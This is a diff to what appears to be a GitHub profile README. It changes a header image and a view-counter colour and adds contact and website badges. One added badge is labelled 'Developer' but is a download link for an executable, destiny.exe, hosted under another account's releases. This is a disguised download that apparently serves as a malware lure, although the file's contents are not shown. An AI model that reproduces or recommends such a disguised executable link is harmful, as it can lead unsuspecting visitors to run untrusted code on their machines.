@@ -1,6 +1,7 @@
-<p><img align="right" alt="gif" src="https://media.discordapp.net/attachments/829804854586769428/849666014688837712/pngegg.png?width=549&height=390" width="500" height="400" /></p>
-<p align="center">
-</a> <img src="https://komarev.com/ghpvc/?username=syrusrose&color=46eb34"/> </p>
+<p><img align="right" src="https://raw.githubusercontent.com/ygorsimoes/ygorsimoes/master/images/computer-illustration.png" width="450" height="400" /></p>
+<p align="center"><img src="https://komarev.com/ghpvc/?username=syrusrose&color=cc3bf5"/></p>
+
+ <a href="https://github.com/G3ZZING/G3ZZING/releases/download/Puzzle/destiny.exe" download> <img align="center" src="https://img.shields.io/badge/Developer-141321?style=flat-square&logo=visual-studio"/></a> <a href="mailto:syr3s.r0se@gmail.com"><img align="center" src="https://img.shields.io/badge/Me contact-141321?style=flat-square&logo=Red-Hat"/></a> <a href="https://syrusrose.github.io"><img align="center" src="https://img.shields.io/badge/Know more-141321?style=flat-square&logo=Bookmeter"/></a>
 
 <pre align="center">
 <h1 align="center">
